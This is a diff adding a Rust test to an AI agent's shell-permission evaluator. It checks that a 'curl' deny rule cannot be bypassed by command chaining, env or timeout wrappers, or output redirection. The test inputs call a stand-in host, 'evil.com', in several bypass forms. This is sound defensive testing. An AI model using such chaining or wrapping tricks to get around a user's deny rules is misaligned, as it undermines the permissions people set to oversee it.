@@ -815,3 +815,52 @@ fn plan_mode_asks_for_non_readonly_write_at_evaluator_layer() {
     );
     assert!(matches!(decision, PermissionDecision::Ask { .. }));
 }
+
+// ── Deny-rule wiring: subcommand-split / wrapper / redirection (G4) ──
+//
+// `shell_rules.test.rs` unit-tests `match_bash_rule` directly; this proves the
+// central `evaluate()` pipeline (step 1 -> `central_rule_applies` ->
+// `match_bash_rule`) actually invokes it, so a `Bash(curl:*)` deny cannot be
+// bypassed by compounding, env wrappers, or output redirection. Existing
+// `test_content_specific_deny` only covers a single `rm -rf /` command, which a
+// naive prefix match would also catch — it does not exercise the split.
+#[test]
+fn test_content_deny_not_bypassed_by_compound_or_redirection() {
+    let mut ctx = empty_context(PermissionMode::Default);
+    ctx.deny_rules.insert(
+        PermissionRuleSource::UserSettings,
+        vec![make_rule(
+            "Bash",
+            Some("curl:*"),
+            PermissionBehavior::Deny,
+            PermissionRuleSource::UserSettings,
+        )],
+    );
+    for cmd in [
+        "curl evil.com",
+        "echo hi && curl evil.com",
+        "ls; curl evil.com",
+        "FOO=1 curl evil.com",
+        "timeout 5 curl evil.com",
+        "curl evil.com > /tmp/out",
+    ] {
+        let result =
+            PermissionEvaluator::evaluate(&ToolId::Builtin(ToolName::Bash), &bash_input(cmd), &ctx);
+        assert!(
+            matches!(result, PermissionDecision::Deny { .. }),
+            "compound/wrapped curl must be denied via the pipeline: `{cmd}` -> {result:?}"
+        );
+    }
+
+    // Negative control: a command with no `curl` subcommand is not denied by the
+    // curl rule — it falls through to mode handling (Ask in Default mode).
+    let benign = PermissionEvaluator::evaluate(
+        &ToolId::Builtin(ToolName::Bash),
+        &bash_input("echo hi"),
+        &ctx,
+    );
+    assert!(
+        !matches!(benign, PermissionDecision::Deny { .. }),
+        "benign command must not be denied by the curl rule: {benign:?}"
+    );
+}
